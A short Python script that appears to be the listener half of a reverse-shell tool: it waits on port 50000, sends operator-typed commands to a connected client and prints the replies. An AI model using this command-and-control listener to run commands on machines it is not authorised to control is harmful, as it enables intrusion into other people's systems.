
import sys
import socket

# SERVER = "192.168.1.221"
SERVER = "0.0.0.0"
PORT = 50000

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER, PORT))

print(f'[*] listening as {SERVER}:{PORT}')

s.listen(1)

while True:
    client = s.accept()
    print(f'[+] client connected {client[1]}')

    client[0].send('connected'.encode())
    while True:
        cmd = input('>>> ')
        client[0].send(cmd.encode())

        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            break

        result = client[0].recv(1024).decode()
        print(result)

    client[0].close()

    cmd = input('Do you want to exit ?') or 'y'
    if cmd.lower() in ['y', 'yes']:
        break

s.close()
